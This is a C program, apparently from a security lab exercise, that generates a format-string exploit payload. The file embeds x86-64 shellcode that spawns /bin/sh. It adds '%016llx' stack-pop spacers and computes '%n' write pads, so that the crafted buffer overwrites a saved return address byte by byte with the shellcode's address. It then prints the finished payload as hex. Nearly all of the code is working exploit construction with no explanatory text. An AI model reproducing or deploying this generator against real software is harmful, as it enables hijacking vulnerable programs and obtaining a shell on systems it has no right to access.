#include<stdio.h>
#include<stdlib.h>
#include<string.h>

#define taintedbufsize 65536
typedef int bool;
#define true 1
#define false 0

//defining union type for creating addresses with appropriate endianness in a byte[] buffer
union
{
    unsigned long long int llint;
    unsigned char byte[8];
} longlongintUnion;


short int getPadSize(int CurrWriteCount, unsigned int DesiredLowestByte) {
    /*
     * This function computes the pad size needed for %n to write the desired byte.
     */
    short int retVal;
    bool exitcondition;

    retVal=1;
    exitcondition=false;
    while (exitcondition==false) {
        if ((retVal+CurrWriteCount)%0x100==DesiredLowestByte) {
            exitcondition=true;
            break;
        }
        else
            retVal=retVal+1;
    }

    return(retVal);
}

int main(int argc, char **argv)
{
    char** targv;
    int targc;
    targc=8;
    targv = malloc(targc * sizeof(void*)); // allocate the array to hold the pointers

    unsigned long long int shellcodeaddr;
    unsigned long long int oldrbp;

    sscanf(argv[1],"%lx",&shellcodeaddr);
    sscanf(argv[2],"%lx",&oldrbp);

    targv[0]=malloc(sizeof(unsigned long long int));//dummyvar1
  	targv[1]=malloc(sizeof(unsigned long long int));//dummyvar2
  	targv[2]=malloc(sizeof(unsigned long long int));//dummyvar3
  	targv[3]=malloc(sizeof(unsigned long long int));//dummyvar4
  	targv[4]=malloc(sizeof(unsigned long long int));//dummyvar5
  	targv[5]=malloc(sizeof(unsigned long long int));//dummyvar6
  	targv[6]=malloc(sizeof(unsigned long long int));//dummyvar7
  	targv[7]=malloc(sizeof(unsigned long long int));//dummyvar8


    int shellcodesize, spacersize, shellcodecnt, spacercnt;
    int taintedbufWriteCnt;
    int taintedbufWritePtr;
    char *taintedbuf;
    taintedbuf=malloc(taintedbufsize);
    char shellcode[] = "\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48" \
                        "\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\x48\x31\xd2\x48\x31\xc0" \
                        "\xb0\x3b\x0f\x05\x48\x89\xd7\xb0\x3c\x0f\x05\x90\x90\x90\x90\x90" \
                        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    int i;
    for(i=0;i<8;i++)
    {
        printf("0x%llx\n", oldrbp+8+i);
    }

    int numpops=8;//number of "%016llx." pops
    spacersize=(numpops*(sizeof("%016llx ")-1));
    spacercnt=17*numpops;
    char spacer[spacersize];
    for (int i=0;i<numpops; i++ ){
        if (i==0)
            memcpy(spacer,"%016llx ",sizeof("%016llx ")-1);
        else
            memcpy(&spacer[i*(sizeof("%016llx ")-1)],"%016llx ",sizeof("%016llx ")-1);
    }

    shellcodesize=sizeof(shellcode)-1;
    shellcodecnt=sizeof(shellcode)-1;

    short int pad1, pad2, pad3, pad4, pad5, pad6, pad7, pad8;

    taintedbufWritePtr=0;
    taintedbufWriteCnt=0;

    //prep taintedbuf
  	//write the shellcode to the crafted exploit buffer
  	memcpy(&taintedbuf[taintedbufWritePtr],&shellcode[0],shellcodesize);
  	taintedbufWritePtr=taintedbufWritePtr+shellcodesize;
  	taintedbufWriteCnt=taintedbufWriteCnt+shellcodecnt;

    //Need to sync the stack in the snprintf (skip over values prior to buf[] and over the shellcode values, which are at the start of buf[])
  	memcpy(&taintedbuf[taintedbufWritePtr],&spacer[0],spacersize);
  	taintedbufWritePtr=taintedbufWritePtr+spacersize;
  	taintedbufWriteCnt=taintedbufWriteCnt+spacercnt;

    //compute the pad sizes
  	pad1=getPadSize(taintedbufWriteCnt, shellcodeaddr & 0xFF);
  	taintedbufWriteCnt=taintedbufWriteCnt+pad1;
  	pad2=getPadSize(taintedbufWriteCnt, (shellcodeaddr>>8) & 0xFF);
  	taintedbufWriteCnt=taintedbufWriteCnt+pad2;
  	pad3=getPadSize(taintedbufWriteCnt, (shellcodeaddr>>16) & 0xFF);
  	taintedbufWriteCnt=taintedbufWriteCnt+pad3;
  	pad4=getPadSize(taintedbufWriteCnt, (shellcodeaddr>>24) & 0xFF);
  	taintedbufWriteCnt=taintedbufWriteCnt+pad4;
  	pad5=getPadSize(taintedbufWriteCnt, (shellcodeaddr>>32) & 0xFF);
  	taintedbufWriteCnt=taintedbufWriteCnt+pad5;
  	pad6=getPadSize(taintedbufWriteCnt, (shellcodeaddr>>40) & 0xFF);
  	taintedbufWriteCnt=taintedbufWriteCnt+pad6;
  	pad7=getPadSize(taintedbufWriteCnt, (shellcodeaddr>>48) & 0xFF);
  	taintedbufWriteCnt=taintedbufWriteCnt+pad7;
  	pad8=getPadSize(taintedbufWriteCnt, (shellcodeaddr>>56) & 0xFF);

    char tempstr[512];
    char formatstr[512];

    memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad1);//e.g., "%040hi%n", where pad1=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

  	memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad2);//e.g., "%040hi%n", where pad2=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");//add the write request "%%n"
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

  	memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad3);//e.g., "%040hi%n", where pad3=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");//add the write request "%%n"
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

  	memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad4);//e.g., "%040hi%n", where pad4=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");//add the write request "%%n"
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

  	memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad5);//e.g., "%040hi%n", where pad5=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");//add the write request "%%n"
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

  	memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad6);//e.g., "%040hi%n", where pad6=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");//add the write request "%%n"
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

  	memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad7);//e.g., "%040hi%n", where pad7=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");//add the write request "%%n"
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

  	memset(tempstr,0,sizeof(tempstr));//clear the buffer
  	sprintf(formatstr,"%%0%dhi",pad8);//e.g., "%040hi%n", where pad8=40
  	sprintf(tempstr,formatstr,0);
  	sprintf(formatstr,"%%n");//add the write request "%%n"; also, add a newline to the final value
  	memcpy(&tempstr[strlen(tempstr)],formatstr,strlen(formatstr));
  	memcpy(&taintedbuf[taintedbufWritePtr],tempstr,strlen(tempstr));
  	taintedbufWritePtr=taintedbufWritePtr+strlen(tempstr);

    numpops=16;//number of "%016llx." pops
    spacersize=(numpops*(sizeof("%016llx ")-1));
    char spacer2[spacersize];
    for (int i=0;i<numpops; i++ ){
        if (i==0)
            memcpy(spacer2,"%016llx ",sizeof("%016llx ")-1);
        else
            memcpy(&spacer2[i*(sizeof("%016llx ")-1)],"%016llx ",sizeof("%016llx ")-1);
    }

    //Need to sync the stack in the snprintf (skip over values prior to buf[] and over the shellcode values, which are at the start of buf[])
  	memcpy(&taintedbuf[taintedbufWritePtr],&spacer2[0],spacersize);
  	taintedbufWritePtr=taintedbufWritePtr+spacersize;
    strncpy(&taintedbuf[taintedbufWritePtr], "\n", 1);
    taintedbufWritePtr += 1;

    printf("taintedbuf:\n");
  	for (int i=0;i<taintedbufWritePtr;i++) {
  		printf("\\x%02x",(unsigned char)taintedbuf[i]);
  	}
    printf("\\x00");
    printf("\n");
    return 0;
}
